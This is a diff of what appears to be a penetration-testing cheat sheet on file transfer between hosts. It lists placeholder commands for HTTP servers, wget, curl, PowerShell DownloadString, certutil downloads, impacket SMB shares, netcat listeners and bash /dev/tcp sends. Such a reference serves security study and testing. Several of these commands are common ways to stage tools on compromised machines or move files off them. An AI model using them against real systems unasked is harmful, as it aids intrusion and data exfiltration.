@@ -4,92 +4,98 @@
 You can always check the integrity of the files using `md5sum` to ensure they were transferred successfully.
 {% endhint %}
 
-## Sending
+## HTTP/PHP
 
 ### Python3
 
 ```bash
-python3 -m http.server <PORT>
+python3 -m http.server <port>
 ```
 
 ### Python2
 
 ```bash
-python -m SimpleHTTPServer <PORT>
+python2 -m SimpleHTTPServer <port>
 ```
 
 ### PHP
 
 ```bash
-php -S 0.0.0.0:<PORT>
+php -S 0.0.0.0:<port>
 ```
 
-### SMB
+### Download
+
+#### Wget
 
 ```bash
-smbserver.py <SHARE_NAME> $(pwd) -smb2support
+wget <url>
 ```
 
-### Ncat
+#### Curl
 
 ```bash
-nc -nlvp <PORT> < <FILE>
+curl -s <url> -o <output>
 ```
 
-### Bash
-
-```bash
-cat <FILE> > /dev/tcp/<IP>/<PORT>
-```
-
-## Receiving
-
-### Ncat
-
-```bash
-nc -nlvp <PORT> > <OUTPUT_FILE>
-```
-
-### Bash
-
-```bash
-cat < /dev/tcp/<IP>/<PORT> > <OUTPUT_FILE>
-```
-
-### Wget
-
-```bash
-wget <URL>
-```
-
-### Curl
-
-```bash
-curl -s <URL> -o <OUTPUT_FILE>
-```
-
-### SMB
-
-Linux
-
-```bash
-smbclient //<IP>/<SHARE_NAME> -c "get <FILE> <OUTPUT_FILE>"
-```
-
-Windows
-
-```batch
-copy \\<IP>\<SHARE_NAME>\<FILE> <OUTPUT_FILE>
-```
-
-### PowerShell
+#### PowerShell
 
 ```powershell
-(New-Object Net.WebClient).DownloadString('<URL>') > <OUTPUT_FILE>
+(New-Object Net.WebClient).DownloadString('<url>') > <output>
 ```
 
-### Batch
+#### Batch
 
 ```batch
-certutil -urlcache -split -f <URL> <OUTPUT_FILE>
+certutil -urlcache -split -f <url> <output>
+```
+
+## SMB
+
+### SMB Server
+
+```bash
+smbserver.py <share> $(pwd) -smb2support
+```
+
+### Download
+
+#### Linux
+
+```bash
+smbclient //<ip>/<share> -c "get <file> <output>"
+```
+
+#### Windows
+
+```batch
+copy \\<ip>\<share>\<file> <output>
+```
+
+## Ncat
+
+### Send
+
+```bash
+nc -nlvp <port> < <file>
+```
+
+### Recieve
+
+```bash
+nc -nlvp <port> > <output>
+```
+
+## Bash
+
+### Send
+
+```bash
+cat <file> > /dev/tcp/<ip>/<port>
+```
+
+### Recieve
+
+```bash
+cat < /dev/tcp/<target>/<port> > <output>
 ```
